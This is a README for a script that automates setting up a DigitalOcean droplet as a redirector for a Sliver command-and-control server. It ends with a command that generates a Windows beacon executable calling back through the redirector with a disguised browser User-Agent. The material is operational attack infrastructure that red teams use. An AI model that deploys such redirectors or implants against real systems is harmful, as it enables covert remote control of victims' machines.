# DigitalOcean C2 Redirector Automation Script

This Python script provides a command-line interface to automate the deployment of a redirector server for sliver, using DigitalOcean droplets.


## Prerequisites

* **Python 3.x:** Installed on your local machine.
* **DigitalOcean Personal Access Token (API Key):** Generate one from your DigitalOcean control panel under "API" -> "Tokens/Keys". Ensure it has read/write access.
* **SSH Keypair:** You should have an SSH keypair generated on your local machine (e.g., `id_rsa` and `id_rsa.pub` on Linux/macOS, or generated via OpenSSH in PowerShell on Windows). Your public key must be uploaded to your DigitalOcean account.

## Installation

1.  **Clone this repository** (or save the ` .py` script to your desired location).
2.  **Install the prerequisites:**
    ```bash
    pip install python-digitalocean
    pip install paramiko
    ```
## General Usage

The script uses `argparse` for command-line arguments. The basic syntax is:

```bash
python run.py YOUR_DIGITALOCEAN_API_KEY <resource> <action> [optional_arguments]
```

The basic syntax to create a redirector through a DigitalOcean droplet is
```bash
python redirectorC2setup.py YOUR_DIGITALOCEAN_API_KEY droplets create-c2-redirector --ssh_keys SSH_KEY_ID --private-key-path PATH_TO_PRIVATE_KEY --C2-IP IP_OF_C2_SERVER --private-key-passphrase SSH_PRIVATE_KEY_PASSPHRASE
```
(To get your public ssh key id, first run 
```bash
python redirectorC2setup.py YOUR_API_KEY keys list
```
which will return a list of SSH keys and their corresponding IDs)

The command will take aroind 5 minutes to run and return the redirector ip.

Once done, to create a very basic beacon in sliver that uses the redirector, run 
```bash
generate --http  "https://REDIRECTOR_IP/,User-Agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0.0.0" --save /root/sliver-beacon.exe
```
